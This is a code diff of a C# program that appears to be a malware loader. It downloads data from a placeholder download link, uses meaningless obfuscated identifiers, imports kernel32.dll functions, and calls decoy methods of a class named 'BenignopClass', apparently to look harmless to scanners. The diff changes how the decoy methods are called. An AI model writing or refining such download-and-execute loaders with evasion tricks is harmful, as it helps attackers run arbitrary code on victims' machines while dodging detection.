@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -7,7 +7,8 @@ class Program
 {
     static void Main(string[] args)
     {
-        string downloadLink = "[DOWNLOAD_LINK]"; // Replace 
+        // Replace [DOWNLOAD_LINK] with an actual download link
+        string downloadLink = "[DOWNLOAD_LINK]";
 
         WebClient wc = new WebClient();
         byte[] sfhbsgjhgjghhbsjbvejs = wc.DownloadData(downloadLink);
@@ -27,10 +28,11 @@ class Program
 
     static void dhdsfhbsgjhgjghhbsjbvejsfgdfg()
     {
-        MethodInfo[] methods = typeof(BenignopClass).GetMethods();
-        Random rand = new Random();
-        int index = rand.Next(methods.Length);
-        methods[index].Invoke(null, null);
+        // This method calls methods from BenignopClass
+        // Make sure these methods exist in BenignopClass
+        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg1();
+        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg2();
+        BenignopClass.mddhdsfhbsgjhgjghhbsjbvejsfgdfg3();
     }
 
     [DllImport("kernel32.dll", SetLastError = true)]
